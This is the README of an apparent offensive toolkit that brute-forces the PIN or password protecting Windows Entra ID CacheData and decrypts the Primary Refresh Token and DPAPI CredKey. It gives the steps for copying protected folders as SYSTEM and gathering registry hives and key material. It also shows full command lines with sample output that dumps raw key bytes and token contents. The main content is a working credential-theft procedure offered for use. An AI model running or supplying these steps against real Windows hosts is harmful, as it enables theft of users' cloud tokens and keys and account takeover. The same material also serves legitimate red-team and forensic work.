# CacheData_decrypt

A simple Toolkit to BF and decrypt Windows EntraId CacheData.

```
usage: decrypt_cachedata.py [-h] {pin,password} ...

CacheData bruteforcer. On a live windows host, to copy the folders with all
subfolders and files: xcopy <folder> <destination> /H /E /G /C as SYSTEM. The
script will automatically iterates on each Entra ID user who has logged in on
the device. If you want to bruteforce the PIN for only one user, use the --sid
parameter.

positional arguments:
  {pin,password}  Available subparser (pin or password)
    pin           BF pin.
    password      BF password.

options:
  -h, --help      show this help message and exit
```

## Installation

Create a Python3 virtual env and install the requirements:

```
python3 -m venv ./my_venv
source ./my_venv/bin/activate
pip3 install -r requirements.txt
```

## Example

### PIN

Example to bruteforce a PIN, and decrypt the PRT + DPAPI CredKey.

Ensure to gather all required files and directories:

```
ls -ld CacheData secrets/Ngc/ PIN.txt secrets/system secrets/security secrets/Crypto/Keys/ secrets/masterkey/
-rw-r--r-- 1 user user    14036 Feb 15 11:12 CacheData
-rw-r--r-- 1 user user       21 Apr 22 10:56 PIN.txt
drwx------ 2 user user     4096 Feb 15 09:59 secrets/Crypto/Keys/
drwxr-xr-x 2 user user     4096 Apr  8 21:57 secrets/masterkey/
drwx------ 3 user user     4096 Feb 15 09:58 secrets/Ngc/
-rwxr-xr-x 1 user user    40960 Apr  8 21:56 secrets/security
-rwxr-xr-x 1 user user 12734464 Apr  8 21:56 secrets/system
```

Start the script with the ``pin`` argument and all required files and directories:

```
python3 decrypt_cachedata.py pin -C CacheData -N secrets/Ngc/ -P PIN.txt \
  --system secrets/system --security secrets/security --keys secrets/Crypto/Keys/ \
  --masterkey secrets/masterkey/

[+] Found PIN: 123456
[+] Parsing CacheData file CacheData
[+] CacheData file version is 0x2
[+] CacheData expected sha256: b'e56c1ec9d053dfd0618aaed1f5bd0ebbaecf9ed11917a526d5714b7c86101423'
[+] CacheData computed sha256: e56c1ec9d053dfd0618aaed1f5bd0ebbaecf9ed11917a526d5714b7c86101423
[+] RSA decrypt encrypted AES key 1
[+] AES decrypt encrypted AES key 2
[+] AES decrypt encrypted blob of size 0x1970 (DPAPI CredKey + PRT)
[+] Dumping raw DPAPI Cred key, with GUID c0c17f7a-2b1e-43ff-a739-f698b29469b5 (0x40 bytes):
00000000: D9 00 C8 20 3A 6E FB 10  EC AD AD 3A 02 28 31 7C  ... :n.....:.(1|
00000010: E4 31 4E 09 A0 CC BE 96  1D 31 FA C5 42 AF CC 56  .1N......1..B..V
00000020: 70 32 6B 1F A3 94 F8 15  B8 63 5A B2 69 A8 ED 07  p2k......cZ.i...
00000030: D4 71 1C 96 8F 49 18 64  23 0F 30 16 6C 6D 1B CE  .q...I.d#.0.lm..
[+] Dumping decrypted PRT file:
{
    "Version": 3,
    "UserInfo": {
        "Version": 2,
        "UniqueId": "57d07212-f77d-402f-90b1-f590b8890bb4",
        "PrimarySid": "S-1-12-1-1473278482-1076885373-2432020880-3020655032",
        ....
    }
    ...
}
```

### Password

Example to bruteforce a password, and decrypt the PRT + DPAPI CredKey.

Start the script with the ``password`` argument and provide the CacheData file and password list:

```
python3 decrypt_cachedata.py password -C CacheData -P password.txt

[+] Password: 'P@ssw0rd!'
[+] Dumping raw DPAPI Cred key, with GUID c0c17f7a-2b1e-43ff-a739-f698b29469b5 (0x40 bytes):
00000000: D9 00 C8 20 3A 6E FB 10  EC AD AD 3A 02 28 31 7C  ... :n.....:.(1|
00000010: E4 31 4E 09 A0 CC BE 96  1D 31 FA C5 42 AF CC 56  .1N......1..B..V
00000020: 70 32 6B 1F A3 94 F8 15  B8 63 5A B2 69 A8 ED 07  p2k......cZ.i...
00000030: D4 71 1C 96 8F 49 18 64  23 0F 30 16 6C 6D 1B CE  .q...I.d#.0.lm..
[+] Dumping decrypted PRT file:
{
    "Version": 3,
    "UserInfo": {
        "Version": 2,
        "UniqueId": "57d07212-f77d-402f-90b1-f590b8890bb4",
        "PrimarySid": "S-1-12-1-1473278482-1076885373-2432020880-3020655032",
        ....
    }
    ...
}
```
